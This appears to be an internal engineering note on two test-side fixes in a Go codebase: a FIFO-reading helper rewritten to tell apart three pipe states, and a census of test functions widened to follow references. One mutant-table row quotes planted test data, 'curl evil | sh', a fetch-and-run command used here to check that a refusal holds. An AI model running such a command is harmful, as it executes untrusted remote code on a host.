# Two arms nothing ran, and a census one frame short (ranger-base-b8igm)

2026-11-22, from a linux seat (Linux 7.2.15 x86_64, go1.27.3, 16 cores). Both
findings came from ranger-base-72t07's verify of four closes; the other two
closes in that batch had nothing to file. No darwin box was touched, and
nothing here is a claim about what a macos leg now does beyond what the Go
source and POSIX already say.

The two fixes have nothing in common but their shape: a rule whose
interesting half nothing exercised, shipped with a comment that said
otherwise. Both were found by grading each arm SEPARATELY rather than
reading a green suite, which is the method worth keeping.

## F1 — the bound's two unwitnessed arms, and the answer they failed open to

`leafReachedThePlanter` (internal/posse/refusalleaf_test.go) read the
planter's end of a planted FIFO under a 500ms bound: a non-blocking read, and
a `unix.Poll` loop behind it. That bound replaced a `SetReadDeadline` that
could not exist on darwin (ranger-base-njj5z has that half). 72t07 graded its
four arms and found the two the fix had ADDED were the two nothing reached:

| arm | planted fatal | verdict |
|---|---|---|
| bytes, `n > 0` | — | graded: the only red under its own mutant |
| EOF, `err == nil` | line 177 | reds two tests — witnessed |
| timeout, `left <= 0` | line 184 | `ok 0.079s` — NOT REACHED |
| the `unix.Poll` call | line 186 | `ok 0.188s` — NOT REACHED |

And the collapse that left: with a writer holding the pipe open and nothing
written — not EOF, not bytes — the bound returned `""` after 499.2ms, which
is byte-identical to its answer for "the refusal held". The one state the
read cannot answer was folded into the answer the assertions read as a pass.

**The fix is the smaller of the two shapes 72t07 offered: the wait is gone.**
Every caller reads after the call under test has RETURNED, and a pipe write is
buffered, so whatever that call wrote is already there — a reader that sees
nothing at that instant sees nothing later either, because the only writer
there could be has finished. There was never anything to wait for. What the
wait DID add was an answer, and that answer was the wrong one.

`leafPeekPlanter` reads once, without blocking, and names which of the pipe's
three states it found: bytes, closed (EOF — no writer holds it), or held open
and empty (EAGAIN). POSIX read(2) gives exactly those three over a FIFO and no
others. `leafReachedThePlanter` is then a two-line helper over it that fatals
on the third, because a writer holding the leaf at the instant of the read IS
the refusal having failed.

`TestLeafReachedThePlanterReadsThePipesThreeStatesApart` (was
`…SeesWhatIsInThePipe`) measures all three on whichever host is running, and
the third reading is the one that did not exist before: it is the only test on
this box that puts the pipe in that state at all, and it asserts the state is
DISTINGUISHABLE from "closed" rather than equal to it.

MEASURED 2026-11-22, the nine tests of the file run together:

| mutant | verdict |
|---|---|
| control | `ok 0.068s` (was 0.079-0.188s; no 500ms wait anywhere) |
| panic at the head of the bytes arm | reds the pin, names the arm |
| panic at the head of the closed arm | reds the pin, names the arm |
| panic at the head of the EAGAIN arm | reds the pin, names the arm |
| bytes arm answers `""` (72t07's N1) | the pin is the ONLY red in the file |
| EAGAIN collapsed into closed (the old bound's answer after 500ms) | the pin is the ONLY red in the file |
| the refusal narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()` (ranger-base-q2peg's) | the pin stays GREEN; the fold test reds and reads `session=s1 curl evil \| sh` back out of the pipe, with the three write-site plant arms |

Two lines are still run by nothing, and the file says so rather than claiming
otherwise: both `t.Fatalf`s, and the `default` arm that feeds the first of
them. MEASURED: with `if state == leafPipeOpen` turned into `if false` every
test of the file still passes. The difference from the arm this bead is about
is the DIRECTION they fail in — a fatal nothing runs can only fail to fire,
while the timeout arm nothing ran was an answer, and the answer it gave was
the one the assertions read as "nothing arrived".

Two readings taken for comments that needed them, both 2026-11-22 on this box
over a FIFO a writer holds open with nothing in it:

- the raw `unix.Read` answers EAGAIN in **1.092µs**;
- `os.NewFile(rd).Read` over the same descriptor was still **blocked at 3s**,
  because `os.NewFile` puts a pollable non-blocking descriptor in the runtime
  poller and a read that would answer EAGAIN waits for readiness instead.

That second one is why the descriptor stays raw. It is also a reading the
darwin exclusion in `os/file_unix.go` (Go issue #24164) does not reach: on
linux the FIFO IS pollable, so the hang is the linux behaviour, not darwin's.

## F2 — a census whose ship half was intra-procedural

`wmqFunc.member()` (internal/treepins/wallmechanswer_qa_test.go) asked two
questions of one function body: does it build its own `landedChecker`, and
does it name the wall check. 72t07 walked two shapes straight through it, both
green on arm 1:

- **(a) the ship one frame down.** `func qa72t07ship(t, repo) {
  shipWallCheck(t, repo, …) }` plus a body that calls it and
  `newLandedChecker`: the body is `builds && !ships`, the helper is
  `ships && !builds`, and neither is a member. This is not a contrived shape —
  `shipWallCheck` has exactly ONE call site in the tree, inside `wckFixture`,
  which is ship + build + answer in a single body, so extracting the ship is
  the most ordinary refactor available and it empties the class with the suite
  green.
- **(b) the const through a package var.** `var qa72t07script =
  wallCheckScript`, read from a body that builds its own checker.

**The fix: `ships` is a fixpoint over reference edges.** A declaration ships
if it names the wall check itself or reads any declaration of the subject
package's test sources that does, at any depth — and package-level `var`/
`const` declarations are declarations here, which is shape (b). Both sibling
pins that landed in the same batch had already paid for that lesson:
ranger-base-u5ez8 closes over parameter indices because 2 of its 3 historical
escapes put the open a frame down, and ranger-base-jhmm7 reaches the home
three hops through a fixture.

**The answer half does NOT close, deliberately, and the head comment now says
so where it used to claim more.** The choice is between a false green and a
false red. An inherited answer would make the census read green over a member
whose seam it had resolved by name — silently, which is this file's whole
defect class. An answer demanded in the member's own body can only cost a red
over a body that pins the mechanism one frame down; that red names the body,
and the fix is the same one line both historical fixes were. Arm 3 carries a
row that holds the choice (`an answer one frame down is NOT this census's
answer — a red, deliberately`) so it cannot drift into an accident.

What went with it: the old head comment's "the third one is caught by a suite"
is gone — it covered shapes the rule could not see — and a blindness list
replaces it, naming the five directions a green here says nothing about.

**The prefilter is gone too, and the closure is what killed it.** A relay
frame between a member and the ship names neither `newLandedChecker` nor the
script, so a census of the 9 files naming the builder cannot see the edge it
hangs on. The whole directory is parsed now: 763 test files, 13.5MB, 7,251
function bodies, 509,070 identifiers, **0.20s** (MEASURED 2026-11-22, this
box). Arm 1 runs in 0.28s, arm 2 in 1.09s (it rebuilds the corpus once per
member, because a ship can be several files away), arm 3 in 0.006s.

MEASURED 2026-11-22 against the REAL tree — each shape planted in
internal/posse as a file of its own, which has only to parse because the
census never builds that directory:

| plant | arm 1 |
|---|---|
| control | green, the same 3 members |
| the ship one frame down — shape (a) | RED, names the caller |
| the const through a package var — shape (b) | RED, names the body |
| both of those, each answering in its own body | green |
| a brand-new fourth member answering nothing | RED, names it |
| the venue arm's own `c.wallMechFn =` blanked (line 318) | RED, names it |

The first cut was green over rows 2 and 3, which is the finding. Rows 5 and 6
are the close's own mutants, re-measured so the widening does not rest on
them. The member set over the tree is unchanged — `wckFixture`,
`TestQATheVenueCallSiteDiffersFromTheJudgesInTheKindAndTheChildOnly`,
`TestATreeThatShipsNoWallCheckIsLeftAloneEntirely`, each answering in its own
body — so the widening costs no red on today's tree, and 72t07's reading that
the class has no live member outside those three stands.

Arm 1 also gained a fourth dark-census assertion: at least one declaration
must name the wall check DIRECTLY. The const block always claimed arm 1
asserted each of its four spellings was still findable; it asserted the
builder and the seam declaration, and a rename of `shipWallCheck`,
`wallCheckScript` and the path literal together would have left every member
reaching nothing and the census green over all of them.

## what did not change

- No production code. Both fixes are test-side: one helper rewritten, one
  census widened.
- `TestLeafReachedThePlanterSeesWhatIsInThePipe` was RENAMED, so
  docs/notes.d/ranger-base-njj5z.md names a test that no longer exists. That
  fragment is left as it was — it records what was true when it was written —
  and the new name is `TestLeafReachedThePlanterReadsThePipesThreeStatesApart`.
- 72t07's reading that macos arm 2 goes green at the njj5z fix is not
  disputed and is not re-measured here: the defect was the missing control,
  not the port, and the taken path on darwin is read -> 0 -> EOF as it is
  here.
